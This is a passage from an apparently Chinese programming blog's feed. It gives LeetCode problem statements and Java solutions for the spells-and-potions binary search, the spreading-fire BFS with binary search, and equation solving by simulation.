1：</strong></p><pre><b>输入：</b>spells = [5,1,3], potions = [1,2,3,4,5], success = 7<b>输出：</b>[4,0,3]<strong>解释：</strong>- 第 0 个咒语：5 * [1,2,3,4,5] = [5,<em><strong>10</strong></em>,<em><strong>15</strong></em>,<em><strong>20</strong></em>,<em><strong>25</strong></em>] 。总共 4 个成功组合。- 第 1 个咒语：1 * [1,2,3,4,5] = [1,2,3,4,5] 。总共 0 个成功组合。- 第 2 个咒语：3 * [1,2,3,4,5] = [3,6,<em><strong>9</strong></em>,<em><strong>12</strong></em>,<em><strong>15</strong></em>] 。总共 3 个成功组合。所以返回 [4,0,3] 。</pre><p><strong>示例 2：</strong></p><pre><b>输入：</b>spells = [3,1,2], potions = [8,5,8], success = 16<b>输出：</b>[2,0,2]<strong>解释：</strong>- 第 0 个咒语：3 * [8,5,8] = [<em><strong>24</strong></em>,15,<em><strong>24</strong></em>] 。总共 2 个成功组合。- 第 1 个咒语：1 * [8,5,8] = [8,5,8] 。总共 0 个成功组合。- 第 2 个咒语：2 * [8,5,8] = [<em><strong>16</strong></em>,10,<em><strong>16</strong></em>] 。总共 2 个成功组合。所以返回 [2,0,2] 。</pre><p><strong>提示：</strong></p><ul>    <li><code>n == spells.length</code></li>    <li><code>m == potions.length</code></li>    <li><code>1 &lt;= n, m &lt;= 10<sup>5</sup></code></li>    <li><code>1 &lt;= spells[i], potions[i] &lt;= 10<sup>5</sup></code></li>    <li><code>1 &lt;= success &lt;= 10<sup>10</sup></code></li></ul></div><ol><li><p>思路</p><blockquote><p>刚看的时候想到暴力A，但是第52个用例开始超时，所以改用二分法，找到排序后的药水最左边满足条件的下标，n - left 为第 i 个魔法成功的对数。</p></blockquote></li><li><p>解题方法</p><blockquote><p>对药水进行递增排序，然后二分查找满足 success 的药水下标。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:（不算sort）</p><blockquote><p>$O(mlogn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p> $O(n)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] successfulPairs(<span class="type">int</span>[] spells, <span class="type">int</span>[] potions, <span class="type">long</span> success) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> spells.length, n = potions.length;</span><br><span class="line">         Arrays.sort(potions);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l &lt;= r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + (r - l) / <span class="number">2</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">check</span> <span class="operator">=</span> (<span class="type">long</span>)spells[i] * (<span class="type">long</span>)potions[mid];</span><br><span class="line">                <span class="keyword">if</span> (check &lt; success) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res[i] = n - l;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 暴力在第52个案例超时，尝试用二分</span></span><br><span class="line">            <span class="comment">// int su = 0;</span></span><br><span class="line">            <span class="comment">// for (int j = 0; j &lt; n; j++) &#123;</span></span><br><span class="line">            <span class="comment">//     long check = (long)spells[i] * (long)potions[j];</span></span><br><span class="line">            <span class="comment">//     if (check &gt;= success) &#123;</span></span><br><span class="line">            <span class="comment">//         su  = su + (n - j);</span></span><br><span class="line">            <span class="comment">//         break;</span></span><br><span class="line">            <span class="comment">//     &#125;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="comment">// res[i] = su;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2258-逃离火灾（困难）"><a href="#2258-逃离火灾（困难）" class="headerlink" title="2258. 逃离火灾（困难）"></a>2258. 逃离火灾（困难）</h5><p>图+BFS+二分查找</p><blockquote><p>Problem: <a href="https://leetcode.cn/problems/escape-the-spreading-fire/description/">2258. 逃离火灾</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个下标从 <strong>0</strong>&nbsp;开始大小为 <code>m x n</code>&nbsp;的二维整数数组&nbsp;<code>grid</code>&nbsp;，它表示一个网格图。每个格子为下面 3 个值之一：</p><ul>    <li><code>0</code> 表示草地。</li>    <li><code>1</code> 表示着火的格子。</li>    <li><code>2</code>&nbsp;表示一座墙，你跟火都不能通过这个格子。</li></ul><p>一开始你在最左上角的格子&nbsp;<code>(0, 0)</code>&nbsp;，你想要到达最右下角的安全屋格子&nbsp;<code>(m - 1, n - 1)</code>&nbsp;。每一分钟，你可以移动到&nbsp;<strong>相邻</strong>&nbsp;的草地格子。每次你移动 <strong>之后</strong>&nbsp;，着火的格子会扩散到所有不是墙的 <strong>相邻</strong>&nbsp;格子。</p><p>请你返回你在初始位置可以停留的 <strong>最多 </strong>分钟数，且停留完这段时间后你还能安全到达安全屋。如果无法实现，请你返回 <code>-1</code>&nbsp;。如果不管你在初始位置停留多久，你 <strong>总是</strong>&nbsp;能到达安全屋，请你返回&nbsp;<code>10<sup>9</sup></code>&nbsp;。</p><p>注意，如果你到达安全屋后，火马上到了安全屋，这视为你能够安全到达安全屋。</p><p>如果两个格子有共同边，那么它们为 <strong>相邻</strong>&nbsp;格子。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://assets.leetcode.com/uploads/2022/03/10/ex1new.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2022/03/10/ex1new.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 650px; height: 404px;"></p><pre><b>输入：</b>grid = [[0,2,0,0,0,0,0],[0,0,0,2,2,1,0],[0,2,0,0,1,2,0],[0,0,2,2,2,0,2],[0,0,0,0,0,0,0]]<b>输出：</b>3<b>解释：</b>上图展示了你在初始位置停留 3 分钟后的情形。你仍然可以安全到达安全屋。停留超过 3 分钟会让你无法安全到达安全屋。</pre><p><strong>示例 2：</strong></p><p><img alt="" src="https://assets.leetcode.com/uploads/2022/03/10/ex2new2.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2022/03/10/ex2new2.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 515px; height: 150px;"></p><pre><b>输入：</b>grid = [[0,0,0,0],[0,1,2,0],[0,2,0,0]]<b>输出：</b>-1<b>解释：</b>上图展示了你马上开始朝安全屋移动的情形。火会蔓延到你可以移动的所有格子，所以无法安全到达安全屋。所以返回 -1 。</pre><p><strong>示例 3：</strong></p><p><img alt="" src="https://assets.leetcode.com/uploads/2022/03/10/ex3new.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2022/03/10/ex3new.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 174px; height: 150px;"></p><pre><b>输入：</b>grid = [[0,0,0],[2,2,0],[1,2,0]]<b>输出：</b>1000000000<b>解释：</b>上图展示了初始网格图。注意，由于火被墙围了起来，所以无论如何你都能安全到达安全屋。所以返回 10<sup>9</sup> 。</pre><p><strong>提示：</strong></p><ul>    <li><code>m == grid.length</code></li>    <li><code>n == grid[i].length</code></li>    <li><code>2 &lt;= m, n &lt;= 300</code></li>    <li><code>4 &lt;= m * n &lt;= 2 * 10<sup>4</sup></code></li>    <li><code>grid[i][j]</code>&nbsp;是&nbsp;<code>0</code>&nbsp;，<code>1</code>&nbsp;或者&nbsp;<code>2</code>&nbsp;。</li>    <li><code>grid[0][0] == grid[m - 1][n - 1] == 0</code></li></ul></div><ol><li><p>思路</p><blockquote><p>题目为找人可以延迟多少分钟后再逃，即找最大延迟时间，设最大延迟时间为 t，只要在不超过 t 时间内这个人都是可以逃得掉的，那么这道题可以转化为找 t 时间，可以用二分查找。</p></blockquote></li><li><p>解题方法</p><blockquote><p>t 时间的范围为 0 到 m * n - 1，先求火在 t 时间蔓延有没有遇到人，如果没有遇到再让人和火一起赛跑，如果蔓延到人了就 GG 然后继续循环，直到找到最大的 t 时间。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>添加时间复杂度： check 时间复杂度 $O(mn)$，二分时间复杂度 $O(logmn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>添加空间复杂度： $O(m * n)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 二分查找</span></span><br><span class="line">    <span class="type">int</span>[][] dirs = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="type">boolean</span> ok;</span><br><span class="line">    <span class="type">int</span>[][] g, fg, pg;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumMinutes</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        m = grid.length;</span><br><span class="line">        n = grid[<span class="number">0</span>].length;</span><br><span class="line">        g = grid;</span><br><span class="line">        fg = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        pg = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="comment">// 判断刚开始人是否能逃</span></span><br><span class="line">        <span class="keyword">if</span> (!check(<span class="number">0</span>)) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 开始做最右边界的二分查找</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = m * n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (check(mid)) &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r == m * n -<span class="number">1</span> ? (<span class="type">int</span>)<span class="number">1e9</span> : r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查第 t 秒人是否能逃</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> t)</span> &#123;</span><br><span class="line">        ok = <span class="literal">false</span>;</span><br><span class="line">        Queue&lt;<span class="type">int</span>[]&gt; fire = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 先找出原始火的位置，加入队列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j ++) &#123;</span><br><span class="line">                <span class="comment">// 每次检查 t 都要初始化人和火的位置</span></span><br><span class="line">                fg[i][j] = pg[i][j] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (g[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    fg[i][j] = <span class="number">1</span>;</span><br><span class="line">                    fire.offer(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, j&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// bfs t 秒后火蔓延的位置</span></span><br><span class="line">        <span class="keyword">while</span>(t-- &gt; <span class="number">0</span>) update(fire, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 如果火蔓延到人的位置，则当前t时间不可</span></span><br><span class="line">        <span class="keyword">if</span> (fg[<span class="number">0</span>][<span class="number">0</span>] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 开始人和火追逐</span></span><br><span class="line">        Queue&lt;<span class="type">int</span>[]&gt; people = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        pg[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        people.offer(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        <span class="keyword">while</span>(!people.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 火先走，到人</span></span><br><span class="line">            update(fire, <span class="literal">true</span>, <span class="number">1</span>);</span><br><span class="line">            update(people, <span class="literal">false</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (ok) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// bfs 函数，true 为 火， false 为 人，offset 为人和火开始走的标识</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Queue&lt;<span class="type">int</span>[]&gt; q, <span class="type">boolean</span> isFire, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sz</span> <span class="operator">=</span> q.size();</span><br><span class="line">        <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span>[] info = q.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> info[<span class="number">0</span>], y = info[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] dir: dirs) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nx</span> <span class="operator">=</span> x + dir[<span class="number">0</span>], ny = y + dir[<span class="number">1</span>];</span><br><span class="line">                <span class="comment">// 判断是否越界</span></span><br><span class="line">                <span class="keyword">if</span> (nx &lt; <span class="number">0</span> || nx &gt;= m || ny &lt; <span class="number">0</span> || ny &gt;= n) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">// 如果为墙</span></span><br><span class="line">                <span class="keyword">if</span> (g[nx][ny] == <span class="number">2</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">// 如果为火</span></span><br><span class="line">                <span class="keyword">if</span> (isFire) &#123;</span><br><span class="line">                    <span class="comment">// 如果不可蔓延</span></span><br><span class="line">                    <span class="keyword">if</span> (fg[nx][ny] != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    fg[nx][ny] = fg[x][y] + offset;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果为人</span></span><br><span class="line">                    <span class="comment">// 如果走到终点，并且终点没有火；或者火已经在了终点（因为check时火比人先走一步），并且人再走一步就到终点，则人可以安全到达</span></span><br><span class="line">                    <span class="keyword">if</span> (nx == m - <span class="number">1</span> &amp;&amp; ny == n - <span class="number">1</span> &amp;&amp; (fg[nx][ny] == <span class="number">0</span> || fg[nx][ny] == pg[x][y] + offset)) ok = <span class="literal">true</span>;</span><br><span class="line">                    <span class="comment">// 如果位置被烧了或者人已经走过，则跳过</span></span><br><span class="line">                    <span class="keyword">if</span> (fg[nx][ny] != <span class="number">0</span> || pg[nx][ny] != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    pg[nx][ny] = pg[x][y] + offset; </span><br><span class="line">                &#125;</span><br><span class="line">                q.offer(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;nx, ny&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;二分查找包括求查找中间值和左右边界值三种情况。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="二分查找" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>模拟题，根据题目规则嵌套if找答案</title>
    <link href="https://blog.zhengxiangling.com/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/"/>
    <id>https://blog.zhengxiangling.com/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/</id>
    <published>2023-11-18T02:50:00.000Z</published>
    <updated>2023-11-18T11:00:43.432Z</updated>
    
    <content type="html"><![CDATA[<p>模拟，即题目给定规则，要求找到符合条件的解。</p><span id="more"></span><p>以算数计算题为例，求解模拟题的过程。</p><h5 id="640-求解方程"><a href="#640-求解方程" class="headerlink" title="640.求解方程"></a>640.求解方程</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/solve-the-equation/description/">640. 求解方程</a></p></blockquote><div class="px-5 pt-4"><div class="flex"></div><div class="xFUwe" data-track-load="description_content"><p>求解一个给定的方程，将<code>x</code>以字符串 <code>"x=#value"</code>&nbsp;的形式返回。该方程仅包含 <code>'+'</code> ， <code>'-'</code> 操作，变量&nbsp;<code>x</code>&nbsp;和其对应系数。</p><p>如果方程没有解或存在的解不为整数，请返回&nbsp;<code>"No solution"</code>&nbsp;。如果方程有无限解，则返回 <code>“Infinite solutions”</code> 。</p><p>题目保证，如果方程中只有一个解，则 <font color="#c7254e"><font face="Menlo, Monaco, Consolas, Courier New, monospace"><span style="font-size: 12.6px;"><span style="background-color: rgb(249, 242, 244);">'x'</span></span></font></font> 的值是一个整数。</p><p>&nbsp;</p><p><strong>示例 1：</strong></p><pre><strong>输入:</strong> equation = "x+5-3+x=6+x-2"<strong>输出:</strong> "x=2"</pre><p><strong>示例 2:</strong></p><pre><strong>输入:</strong> equation = "x=x"<strong>输出:</strong> "Infinite solutions"</pre><p><strong>示例 3:</strong></p><pre><strong>输入:</strong> equation = "2x=x"<strong>输出:</strong> "x=0"</pre><p>&nbsp;</p><p><strong>提示:</strong></p><ul>    <li><code>3 &lt;= equation.length &lt;= 1000</code></li>    <li><code>equation</code>&nbsp;只有一个&nbsp;<code>'='</code>.&nbsp;</li>    <li>方程由绝对值在&nbsp;<code>[0, 100]</code>&nbsp; 范围内且无任何前导零的整数和变量 <code>'x'</code>&nbsp;组成。<span style="display: block;"><span style="height: 0px;"><span style="position: absolute;">&ZeroWidthSpace;&ZeroWidthSpace;&ZeroWidthSpace;</span></span></span></li></ul></div></div><hr><ol><li><p>思路</p><blockquote><p>模拟题，分别对运算符进行判断，找出跟解相关的x和num的值，然后求解。</p></blockquote></li><li><p>解题方法</p><blockquote><p>‘+’和’-‘作为数值符号；’&#x3D;’作为等式左边计算完毕的判断，然后把’x’和’num’的符号取反然后继续运算；’x’如果没有数字要记作1；最后的答案对’x’的值和’num’的值判断即可。</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:<br>跟方程表达式的长度相关，$O(n)$</p></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$。如果用 .charAt() 可以降为$O(1)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">solveEquation</span><span class="params">(String equation)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟法 对 + - = 和 x 分别做判断</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> equation.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, num = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] s = equation.toCharArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">po</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; n) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s[index];</span><br><span class="line">            <span class="comment">// 记录改变数字的符号</span></span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">                index ++;</span><br><span class="line">                po = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                index ++;</span><br><span class="line">                po = -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 左边算完了，对调算右边</span></span><br><span class="line">                x = -x; num = -num; po = <span class="number">1</span>;</span><br><span class="line">                index++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 求数字</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> index;</span><br><span class="line">                <span class="keyword">while</span>(j &lt; n &amp;&amp; s[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; s[j] != <span class="string">&#x27;-&#x27;</span> &amp;&amp; s[j] != <span class="string">&#x27;=&#x27;</span>) j++;</span><br><span class="line">                <span class="comment">// 如果数字后一位为x</span></span><br><span class="line">                <span class="keyword">if</span>(s[j-<span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">                    x += ((j - <span class="number">1</span> == index) ? <span class="number">1</span> : Integer.parseInt(equation.substring(index, j - <span class="number">1</span>))) * po; </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 不为x，记录num的值</span></span><br><span class="line">                    num += Integer.parseInt(equation.substring(index, j)) * po;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 找完数字，继续查找下一个</span></span><br><span class="line">                index=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果没有x，只有数字，无解</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span> &amp;&amp; num != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No solution&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span> &amp;&amp; num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有x和数字，无穷解</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Infinite solutions&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;x=&quot;</span> + -<span class="number">1</span> * (num / x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;模拟，即题目给定规则，要求找到符合条件的解。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="模拟" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A8%A1%E6%8B%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>运用回溯算法，解决排列、组合和子集问题</title>
    <link href="https://blog.zhengxiangling.com/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/"/>
